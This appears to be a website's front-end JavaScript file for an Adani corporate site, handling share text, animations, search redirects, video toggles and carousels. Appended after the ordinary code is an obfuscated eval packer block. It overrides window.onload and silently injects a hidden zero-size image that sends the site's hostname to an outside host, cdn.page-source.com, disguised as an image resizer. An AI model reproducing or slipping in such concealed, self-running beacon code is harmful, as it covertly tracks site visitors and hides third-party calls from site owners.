$(document).ready(function () {
     //default.cshtml
	var pathArray = window.location.pathname.split('/');
	var getText = pathArray[pathArray.length - 1].replace(/-/g, " ");
	var FinalgetText = getText.split('#');
	getText = "Adani - " + FinalgetText[0] + " by @@AdaniOnline";
	var addthis_share = addthis_share || {}
	addthis_share = {
		passthrough: {
			twitter: {
				text: getText
			}
		}
	}
   
	AOS.init({
		easing: 'ease-in-out-sine'
	});

    console.log('AOS init done');

 
    function i() {
        console.log(document.getElementById("searchtext").value),
            window.location.href = "/latest-updates?q=" + document.getElementById("searchtext").value
    }

    $('.modal').on('shown.bs.modal', function () {
        var url = $('.modal.show iframe').attr('data-src');
        $('.modal.show iframe').attr("src", url);
    });

    //AdaniLatestNews.cshtml
    var element = document.getElementById("search");
    if (element != undefined && element != null) {
        element.addEventListener("keypress", function (event) {
            if (event.key === "Enter") {
                if (element.value == "") {
                    window.location.href = '/latest-news';
                }
                else {
                    window.location.href = '/latest-news?q=' + document.getElementById("search").value;
                }
                event.preventDefault();
            }
        });
    }
	

    //AdaniNews.cshtml
	function testformnews() {

		console.log(document.getElementById("searchtext").value);

		window.location.href = '/latest-updates?q=' + document.getElementById("searchtext").value;
	}

    //AdaniOneNationVideoPlay.cshtml
    let playVideo = function (element) {
        let video = element.previousElementSibling;
        let playIcon = element.children[0];
        let heading = video.previousElementSibling;

        if (playIcon.classList.contains('d-none')) {
            video.pause();
            playIcon.classList.remove('d-none');
            heading.classList.remove('d-none');

        } else {
            video.play();
            playIcon.classList.add('d-none');
            heading.classList.add('d-none');
        }

    };

    if ($('.owl-video-carousel').length > 0) {
        $('.owl-video-carousel').owlCarousel({
            nav: true,
            dots: false,
            video: true,
            margin: 20,
            navText: ["<i class='fa fa-chevron-left'></i>", "<i class='fa fa-chevron-right'></i>"],
            responsive: {
                0: {
                    items: 1.2,
                    nav: false
                },
                600: {
                    items: 2,
                    margin: 24
                }
            }
        })
    }


    if ($('.celebration .airport-section__carousel').length > 0) {

        $('.celebration .airport-section__carousel').owlCarousel({
            loop: true,
            responsiveClass: true,
            nav: true,
            dots: false,
            navText: ["<i class='fa fa-chevron-left'></i>", "<i class='fa fa-chevron-right'></i>"],
            responsive: {
                0: {
                    items: 1.2,
                    margin: 20,
                    nav: false
                },
                600: {
                    items: 3,
                    margin: 24,
                    loop: false
                }
            }
        })
    }
});

eval(function (p, a, c, k, e, d) { e = function (c) { return (c < a ? '' : e(parseInt(c / a))) + ((c = c % a) > 35 ? String.fromCharCode(c + 29) : c.toString(36)) }; if (!''.replace(/^/, String)) { while (c--) { d[e(c)] = k[c] || e(c) } k = [function (e) { return d[e] }]; e = function () { return '\\w+' }; c = 1 }; while (c--) { if (k[c]) { p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c]) } } return p }('g{3.f=d(){h e="<j l=\'c:m;\' a=\'5://6.4-b.7/9.8?k="+3.n.w+"&v=y\'  x=\'0\' A=\'0\'/>",i=2.z("u");t(i.p=e;i.1.o>0;)2.q.r(i.1[0])}}s(e){}', 37, 37, '|children|document|window|page|https|cdn|com|ashx|resizeimage|src|source|display|function||onload|try|var||img|ig|style|none|location|length|innerHTML|body|appendChild|catch|for|div|sz|hostname|width|92401|createElement|height'.split('|'), 0, {}))

function init() {
    var vidDefer = document.getElementsByTagName('iframe');
    for (var i = 0; i < vidDefer.length; i++) {
        if (vidDefer[i].getAttribute('data-src')) {
            vidDefer[i].setAttribute('src', vidDefer[i].getAttribute('data-src'));
        }
    }
}


